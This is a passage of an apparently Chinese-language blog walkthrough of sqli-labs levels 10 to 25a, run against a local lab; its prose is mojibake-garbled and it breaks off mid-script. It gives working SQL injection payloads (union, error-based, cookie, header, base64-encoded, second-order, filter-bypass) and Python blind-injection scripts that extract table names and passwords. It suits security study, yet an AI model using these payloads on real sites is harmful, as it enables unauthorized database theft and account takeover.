title="level10"></a>level10</h2><p>ä¸level9åŸºæœ¬ç›¸åŒï¼Œåªéœ€è¦å°†payloadä¸­çš„<code>&#39;</code>æ¢æˆ<code>&quot;</code>å³å¯</p><p>å®Œæ•´è„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> datetimeurl = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-built_in">ascii</span>(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database() having a&gt;&#123;<span class="hljs-number">1</span>&#125;),sleep(<span class="hljs-number">2</span>),null)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span><span class="hljs-string">        # payload = &quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        <span class="hljs-comment"># payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>        t1 = datetime.datetime.now()        response = requests.get(url+payload)        t2 = datetime.datetime.now()        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>æ‰“å¼€ç½‘é¡µæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢</p><p>å…ˆåˆ¤æ–­åˆ—æ•°ï¼Œå½“ä¸‰åˆ—å‡ºç°æŠ¥é”™ï¼Œè¯´æ˜åªæœ‰ä¸¤åˆ—</p><pre><code class="hljs crmsh"><span class="hljs-attr">uname=</span>admin&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192950662.png" alt="image-20210421192950662"></p><p>å°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼ŒæˆåŠŸç™»å½•</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> #&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192757146.png" alt="image-20210421192757146" style="zoom:50%;"><p>è·å–æ•°æ®åº“</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata)##&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193129915.png" alt="image-20210421193129915"></p><p>è·å–åˆ—åï¼Œå­—æ®µå</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit<span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>è¿™ä¸€å…³ä¸ä¸Šé¢å°±æ˜¯ä½¿ç”¨çš„é—­åˆç¬¦å·ä¸åŒï¼Œä½¿ç”¨çš„åŒå¼•å·ï¼Œæ‰€ä»¥åªè¦å°†ä¸Šé¢çš„payloadæ”¹ä¸€ä¸‹å³å¯</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit<span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>è¾“å…¥å•å¼•å·ï¼Œå‡ºç°æŠ¥é”™</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193947944.png" alt="image-20210421193947944"></p><p>åˆ†æä¸€ä¸‹å³å¯</p><p><code>&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code></p><p>ç¬¬äºŒä¸ª<code>&#39;</code>æ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼Œæ‰€ä»¥é—­åˆæ–¹å¼ä¸º<code>&#39;)</code></p><p>ä½†æ˜¯è¿™é¢˜æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å»¶æ—¶ç›²æ³¨</p><p>æ³¨å…¥çš„payload</p><pre><code class="hljs mysql">uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit    uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submitã€€ã€€ã€€ã€€uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submitã€€ã€€ã€€ã€€uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submitã€€ã€€ã€€ã€€uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submitã€€ã€€ã€€ã€€uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submitã€€ã€€ã€€ã€€uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit</code></pre><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>è¿™ä¸€å…³å°±æ˜¯å’Œä¸Šé¢çš„é—­åˆæ–¹å¼ä¸ä¸€æ ·ï¼Œç¨åŠ ä¿®æ”¹å³å¯</p><pre><code class="hljs n1ql">uname= sad&quot; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a # &amp;passwd= <span class="hljs-string">&#x27;) or 1=1 # &amp;submit=Submit</span></code></pre><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>è¿™æ˜¯å•å¼•å·é—­åˆçš„å¸ƒå°”ç›²æ³¨ï¼ŒPOSTå‹</p><p>åˆ¤æ–­ä¾æ®å¯ä»¥æ ¹æ®é¡µé¢å‡ºç°çš„å›¾ç‰‡</p><p>ç™»å½•ä¸æˆåŠŸæ—¶å‡ºç°çš„å›¾ç‰‡</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195038499.png" alt="image-20210421195038499" style="zoom:50%;"><p>ç™»å½•æˆåŠŸçš„å›¾ç‰‡</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195111446.png" alt="image-20210421195111446" style="zoom:50%;"><p>è¿™é‡Œä½¿ç”¨æ—¶é—´ç›²æ³¨</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/4/21 19:54</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : level15.py</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> datetimeurl = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-15/&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span>data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;sad&#x27;</span>,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;Submit&#x27;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        t1 = datetime.datetime.now()        data[<span class="hljs-string">&#x27;uname&#x27;</span>] = payload        response = requests.post(url=url,data=data)        t2 = datetime.datetime.now()        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">5</span>:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>        print(flag)    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>å°†ä¸Šä¸€å…³çš„è„šæœ¬è¯¥ç»™åŒå¼•å·é—­åˆå³å¯</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>updataæ³¨å…¥</p><p>å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>)#&amp;submit=Submit</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202328557.png" alt="image-20210421202328557"></p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>unameå’Œpasswdéƒ½ä½¿ç”¨check_inputè¿‡æ»¤ï¼Œè€Œåœ¨è¿™é‡Œå°†user-agentå’Œipä½œä¸ºè®°å½•ï¼Œæ’å…¥æ•°æ®åº“</p><p>æç¤ºäº†ipåœ°å€å’Œuser-Agentï¼Œåº”è¯¥æ—¶httpå¤´æ³¨å…¥</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202421443.png" alt="image-20210421202421443"></p><p>æŠ“åŒ…åï¼Œåœ¨user-agentçš„ä½ç½®æ’å…¥æ³¨å…¥è¯­å¥</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203429860.png" alt="image-20210421203429860"></p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203658570.png" alt="image-20210421203658570"></p><p>ç™»å½•åæç¤ºäº†refererï¼Œåº”è¯¥æ˜¯åœ¨refererå¤´æ³¨å…¥</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203948670.png" alt="image-20210421203948670"></p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>æ­£å¸¸ç™»å½•ï¼Œå‘ç°ä¸€ä¸ªcookieå­—æ®µ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204122118.png" alt="image-20210421204122118"></p><p>å°è¯•cookieä½ç½®æ³¨å…¥</p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨unionè”åˆæŸ¥è¯¢å³å¯</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204741263.png" alt="image-20210421204741263"></p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-adm&#x27; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users#</code></pre><h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><p>è¿™ä¸€å…³å’Œä¸Šä¸€å…³å°±æ˜¯åŠ äº†ä¸€å±‚base64ç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„æ³¨å…¥ç¼–ç åæäº¤</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205159215.png" alt="image-20210421205159215"></p><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<span class="hljs-attribute">uname</span>=LWFzJyB<span class="hljs-number">1</span>bmlvbiBzZWxlY<span class="hljs-number">3</span>QgMSwyLDMj</code></pre><p>ä½†æ˜¯å‡ºç°æŠ¥é”™</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205525074.png" alt="image-20210421205525074" style="zoom:67%;"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<span class="hljs-attribute">uname</span>=LWFzJykgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsMiwzIw==</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205624679.png" alt="image-20210421205624679" style="zoom:50%;"><p>æ‰€ä»¥åªè¦å°†ä¸Šé¢çš„sqlè¯­å¥ä¿®æ”¹é—­åˆæ–¹å¼å†ç¼–ç æäº¤å³å¯</p><h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p>åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210142530.png" alt="image-20210421210142530"></p><p>è¿™é‡Œåªè¦å°†21å…³çš„åŒå¼•å·æ¢æˆåŒå¼•å·ï¼Œå†base64ç¼–ç </p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&quot; union select 1,2,3#<span class="hljs-attribute">uname</span>=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210212614.png" alt="image-20210421210212614"></p><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-ada&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> from users--+ <span class="hljs-attribute">uname</span>=LWFkYSIgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsZ<span class="hljs-number">3</span>JvdXBfY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KHBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkKSwzIGZyb<span class="hljs-number">20</span>gdXNlcnMj</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210330135.png" alt="image-20210421210330135"></p><h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“æ˜¯getå‹æ³¨å…¥</p><p>ä½†æ˜¯ä½†è¾“å…¥</p><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> %<span class="hljs-number">23</span></code></pre><p>éƒ½ä¼šå‡ºç°è¯­æ³•é”™è¯¯ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ <code>#, --</code>ä¸¤ä¸ªæ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507090028666.png" alt="image-20210507090028666"></p><p>é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„æ³¨é‡Šç¬¦ï¼š;%00æˆ–è€…andå’Œorè¯­å¥è¿›è¡Œé—­åˆ</p><p>payload:    </p><pre><code class="hljs reasonml">?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(0x7e,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>)</span>) from security.users ;%<span class="hljs-number">00</span></code></pre><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507090258902.png" alt="image-20210507090258902"></p><h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><strong>äºŒæ¬¡æ³¨å…¥</strong></p><blockquote><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</p><p>äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥:</p><p>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</p></blockquote><p>æ­£å¸¸ç”¨æˆ·adminå¯ä»¥æ­£å¸¸ç™»å½•ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨å†Œä¸€ä¸ªéæ­£å¸¸çš„æ¶æ„ç”¨æˆ·ï¼Œå‘æ•°æ®åº“ä¸­æ’å…¥æ¶æ„æ•°æ®ï¼Œæ¥ä¿®ä¸ªæ­£å¸¸ç”¨æˆ·adminçš„å¯†ç </p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> adminâ€™<span class="hljs-meta"># </span><span class="hljs-symbol">password:</span> ä»»æ„</code></pre><p>æ³¨å†Œå®Œåå¯ä»¥ä½¿ç”¨è¯¥è´¦å·ç™»å½•</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507091708950.png" alt="image-20210507091708950"></p><p>ç™»å½•åå¯ä»¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç ï¼Œæ­¤æ—¶å¯ä»¥éšæ„ä¿®æ”¹å¯†ç ï¼Œé‚£ä¹ˆadminç”¨æˆ·çš„å¯†ç å°±ä¼šè¢«æ”¹æˆæ”¹å¯†ç </p><p>çœ‹çœ‹æºç ï¼Œåˆ†æåŸç†</p><pre><code class="hljs PHP"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<span class="hljs-variable">$res</span> = mysql_query(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</code></pre><p>å°†ç”¨æˆ·åå’Œå¯†ç å¸¦å…¥</p><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> #<span class="hljs-string">&#x27; and password=&#x27;</span>$curr_pass<span class="hljs-string">&#x27; &quot;;</span></code></pre><p>å¯ä»¥çœ‹åˆ°çœŸæ­£çš„sqlè¯­å¥ä¸º</p><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre><p>è¿™æ¨å°±å¯¼è‡´äº†adminç”¨æˆ·å¯†ç è¢«æ”¹å˜ã€‚</p><h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><p>è¿™ä¸€å…³å°è¯•å¯ä»¥å‘ç°ï¼Œæ˜¯å°†orå’Œandæ›¿æ¢æˆç©º</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093512147.png" alt="image-20210507093512147"></p><p>ä½†æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œå› ä¸ºå®ƒåªè¿‡æ»¤äº†ä¸€æ¬¡</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093742004.png" alt="image-20210507093742004"></p><p>æ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨unionæ³¨å…¥ï¼Œå°±æ˜¯è¦æ³¨æ„orå’Œandå•è¯éœ€è¦åŒå†™ã€‚</p><h2 id="level25a"><a href="#level25a" class="headerlink" title="level25a"></a>level25a</h2><p>è¿™ä¸€å…³å’Œä¸Šä¸€å…³ä¸€æ ·æ˜¯è¿‡æ»¤äº†orå’Œandï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨ç›²æ³¨</p><p>å¯ä»¥ä½¿ç”¨level8ä½¿ç”¨çš„è„šæœ¬ï¼Œå¯¹å…¶payloadç¨åŠ ä¿®æ”¹å³å¯</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span>t = <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        payload = <span 